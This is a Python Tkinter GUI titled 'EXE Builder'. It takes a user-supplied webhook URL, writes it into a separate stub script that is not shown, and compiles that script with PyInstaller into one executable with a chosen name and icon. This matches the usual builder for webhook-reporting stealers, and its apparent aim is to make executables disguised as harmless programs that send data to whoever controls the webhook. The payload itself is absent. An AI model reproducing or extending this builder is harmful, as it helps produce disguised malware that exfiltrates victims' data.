import os
import subprocess
import tkinter as tk
from tkinter import filedialog, messagebox

STUB_SCRIPT_PATH = "stub.py"

def get_input_from_user():
    webhook_url = webhook_url_entry.get()
    if not webhook_url:
        messagebox.showerror("Error", "Webhook URL is required!")
        return None
    return webhook_url

def build_script(webhook_url, exe_name, icon_path):
    if not os.path.exists(STUB_SCRIPT_PATH):
        messagebox.showerror("Error", f"{STUB_SCRIPT_PATH} not found!")
        return

    
    with open(STUB_SCRIPT_PATH, "r", encoding="utf-8") as file:
        script_content = file.read()

    
    script_content = script_content.replace("WEBHOOK_URL = 'webhook'", f"WEBHOOK_URL = '{webhook_url}'")

    
    temp_stub_path = "temp_stub.py"
    with open(temp_stub_path, "w", encoding="utf-8") as file:
        file.write(script_content)

    
    pyinstaller_args = [
        'pyinstaller',           
        '--onefile',             
        '--name', exe_name,      
    ]

    
    if icon_path and os.path.exists(icon_path):
        pyinstaller_args.extend(['--icon', icon_path])

    pyinstaller_args.append(temp_stub_path)  

    
    messagebox.showinfo("Building", "Building your EXE... Please wait.")
    subprocess.run(pyinstaller_args)

    
    os.remove(temp_stub_path)

    messagebox.showinfo("Success", f"{exe_name}.exe has been built successfully!")

def browse_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
    icon_path_entry.delete(0, tk.END)
    icon_path_entry.insert(0, icon_path)

def build_button_clicked():
    webhook_url = get_input_from_user()
    exe_name = exe_name_entry.get()
    icon_path = icon_path_entry.get()

    if not webhook_url or not exe_name:
        messagebox.showerror("Error", "Webhook URL and EXE Name are required!")
    else:
        build_script(webhook_url, exe_name, icon_path)


root = tk.Tk()
root.title("EXE Builder")


tk.Label(root, text="Webhook URL").grid(row=0, column=0, padx=10, pady=5)
webhook_url_entry = tk.Entry(root, width=40)
webhook_url_entry.grid(row=0, column=1, padx=10, pady=5)

tk.Label(root, text="EXE Name").grid(row=1, column=0, padx=10, pady=5)
exe_name_entry = tk.Entry(root, width=40)
exe_name_entry.grid(row=1, column=1, padx=10, pady=5)

tk.Label(root, text="Choose Icon").grid(row=2, column=0, padx=10, pady=5)
icon_path_entry = tk.Entry(root, width=40)
icon_path_entry.grid(row=2, column=1, padx=10, pady=5)
icon_button = tk.Button(root, text="Browse", command=browse_icon)
icon_button.grid(row=2, column=2, padx=10, pady=5)

build_button = tk.Button(root, text="Build Script", command=build_button_clicked)
build_button.grid(row=3, column=0, columnspan=3, pady=10)


root.mainloop()
